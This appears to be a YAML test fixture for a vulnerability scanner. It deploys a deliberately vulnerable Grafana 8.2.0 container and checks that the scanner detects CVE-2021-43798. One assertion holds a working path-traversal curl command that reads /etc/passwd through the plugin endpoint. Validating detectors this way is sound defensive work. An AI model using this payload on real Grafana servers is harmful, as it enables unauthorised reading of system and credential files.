name: grafana-path-traversal
description: "Grafana 8.2.0 with CVE-2021-43798 plugin path traversal — beacon detects arbitrary file read"
tags: [grafana, cve, path-traversal]

services:
  grafana:
    image: grafana/grafana:8.2.0
    ports: ["9232:3000"]
    environment:
      GF_AUTH_ANONYMOUS_ENABLED: "true"

ready:
  cmd: "curl -sf http://localhost:9232/api/health >/dev/null"
  timeout: 60s
  interval: 3s

assertions:
  - name: exploit-grafana-read-etc-passwd
    type: command
    expect:
      command: "curl -sf --path-as-is 'http://localhost:9232/public/plugins/alertlist/../../../../../../../../etc/passwd' | grep -q root"
      exit_code: 0

  - name: detects-grafana-traversal
    type: beacon
    target: localhost:9232
    args: ["--no-enrich", "--scanners", "portscan", "--ports", "3000"]
    expect:
      check_id: cve.grafana_path_traversal

timeout: 5m
